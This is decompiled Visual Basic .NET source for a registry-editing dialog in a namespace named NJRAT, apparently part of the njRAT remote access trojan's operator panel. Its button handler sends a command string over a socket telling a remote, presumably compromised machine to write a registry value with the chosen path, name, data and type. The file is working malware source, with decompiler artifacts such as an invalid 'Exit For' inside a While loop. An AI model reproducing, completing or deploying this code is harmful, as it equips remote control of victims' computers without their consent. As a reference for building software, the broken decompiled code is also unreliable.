Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.Win32

Namespace NJRAT
	' Token: 0x02000023 RID: 35
	<DesignerGenerated()>
	Public Partial Class RGv
		Inherits Form

		' Token: 0x060004BD RID: 1213 RVA: 0x00170244 File Offset: 0x0016E644
		<DebuggerNonUserCode()>
		Public Sub New()
			RGv.__ENCAddToList(Me)
			Me.InitializeComponent()
		End Sub

		' Token: 0x060004BE RID: 1214 RVA: 0x0017025C File Offset: 0x0016E65C
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = RGv.__ENCList
			SyncLock _ENCList
				Dim flag As Boolean = RGv.__ENCList.Count = RGv.__ENCList.Capacity
				If flag Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = RGv.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = RGv.__ENCList(num4)
						flag = weakReference.IsAlive
						If flag Then
							Dim flag2 As Boolean = num4 <> num
							If flag2 Then
								RGv.__ENCList(num) = RGv.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					RGv.__ENCList.RemoveRange(num, RGv.__ENCList.Count - num)
					RGv.__ENCList.Capacity = RGv.__ENCList.Count
				End If
				RGv.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x170001AE RID: 430
		' (get) Token: 0x060004C1 RID: 1217 RVA: 0x001709CC File Offset: 0x0016EDCC
		' (set) Token: 0x060004C2 RID: 1218 RVA: 0x001709E4 File Offset: 0x0016EDE4
		Friend Overridable Property Label1 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label1 = value
			End Set
		End Property

		' Token: 0x170001AF RID: 431
		' (get) Token: 0x060004C3 RID: 1219 RVA: 0x001709F0 File Offset: 0x0016EDF0
		' (set) Token: 0x060004C4 RID: 1220 RVA: 0x00170A08 File Offset: 0x0016EE08
		Friend Overridable Property Label2 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label2 = value
			End Set
		End Property

		' Token: 0x170001B0 RID: 432
		' (get) Token: 0x060004C5 RID: 1221 RVA: 0x00170A14 File Offset: 0x0016EE14
		' (set) Token: 0x060004C6 RID: 1222 RVA: 0x00170A2C File Offset: 0x0016EE2C
		Friend Overridable Property Label3 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label3 = value
			End Set
		End Property

		' Token: 0x170001B1 RID: 433
		' (get) Token: 0x060004C7 RID: 1223 RVA: 0x00170A38 File Offset: 0x0016EE38
		' (set) Token: 0x060004C8 RID: 1224 RVA: 0x00170A50 File Offset: 0x0016EE50
		Friend Overridable Property TextBox1 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox1 = value
			End Set
		End Property

		' Token: 0x170001B2 RID: 434
		' (get) Token: 0x060004C9 RID: 1225 RVA: 0x00170A5C File Offset: 0x0016EE5C
		' (set) Token: 0x060004CA RID: 1226 RVA: 0x00170A74 File Offset: 0x0016EE74
		Friend Overridable Property TextBox3 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox3 = value
			End Set
		End Property

		' Token: 0x170001B3 RID: 435
		' (get) Token: 0x060004CB RID: 1227 RVA: 0x00170A80 File Offset: 0x0016EE80
		' (set) Token: 0x060004CC RID: 1228 RVA: 0x00170A98 File Offset: 0x0016EE98
		Friend Overridable Property Button1 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				Dim flag As Boolean = Me._Button1 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button1.Click, value2
				End If
				Me._Button1 = value
				flag = (Me._Button1 IsNot Nothing)
				If flag Then
					AddHandler Me._Button1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170001B4 RID: 436
		' (get) Token: 0x060004CD RID: 1229 RVA: 0x00170AF8 File Offset: 0x0016EEF8
		' (set) Token: 0x060004CE RID: 1230 RVA: 0x00170B10 File Offset: 0x0016EF10
		Friend Overridable Property ComboBox1 As ComboBox
			<DebuggerNonUserCode()>
			Get
				Return Me._ComboBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ComboBox)
				Me._ComboBox1 = value
			End Set
		End Property

		' Token: 0x060004CF RID: 1231 RVA: 0x00170B1C File Offset: 0x0016EF1C
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "!", Class7.string_1, Me.Path, Class7.string_1, Me.TextBox1.Text, Class7.string_1, Me.TextBox3.Text, Class7.string_1, Conversions.ToString(Me.Typ(Me.ComboBox1.Text)) }))
			Me.Close()
		End Sub

		' Token: 0x060004D0 RID: 1232 RVA: 0x00170BE4 File Offset: 0x0016EFE4
		Public Function Typ(t As String) As Integer
			Dim left As String = t.ToLower()
			Dim flag As Boolean = Operators.CompareString(left, RegistryValueKind.Binary.ToString().ToLower(), False) = 0
			Dim result As Integer
			If flag Then
				result = 3
			Else
				flag = (Operators.CompareString(left, RegistryValueKind.DWord.ToString().ToLower(), False) = 0)
				If flag Then
					result = 4
				Else
					flag = (Operators.CompareString(left, RegistryValueKind.ExpandString.ToString().ToLower(), False) = 0)
					If flag Then
						result = 2
					Else
						flag = (Operators.CompareString(left, RegistryValueKind.MultiString.ToString().ToLower(), False) = 0)
						If flag Then
							result = 7
						Else
							flag = (Operators.CompareString(left, RegistryValueKind.QWord.ToString().ToLower(), False) = 0)
							If flag Then
								result = 11
							Else
								flag = (Operators.CompareString(left, RegistryValueKind.[String].ToString().ToLower(), False) = 0)
								If flag Then
									result = 1
								Else
									Dim num As Integer
									result = num
								End If
							End If
						End If
					End If
				End If
			End If
			Return result
		End Function

		' Token: 0x0400022E RID: 558
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x04000230 RID: 560
		<AccessedThroughProperty("Label1")>
		Private _Label1 As Label

		' Token: 0x04000231 RID: 561
		<AccessedThroughProperty("Label2")>
		Private _Label2 As Label

		' Token: 0x04000232 RID: 562
		<AccessedThroughProperty("Label3")>
		Private _Label3 As Label

		' Token: 0x04000233 RID: 563
		<AccessedThroughProperty("TextBox1")>
		Private _TextBox1 As TextBox

		' Token: 0x04000234 RID: 564
		<AccessedThroughProperty("TextBox3")>
		Private _TextBox3 As TextBox

		' Token: 0x04000235 RID: 565
		<AccessedThroughProperty("Button1")>
		Private _Button1 As Button

		' Token: 0x04000236 RID: 566
		<AccessedThroughProperty("ComboBox1")>
		Private _ComboBox1 As ComboBox

		' Token: 0x04000237 RID: 567
		Public Path As String

		' Token: 0x04000238 RID: 568
		Public sk As Client
	End Class
End Namespace
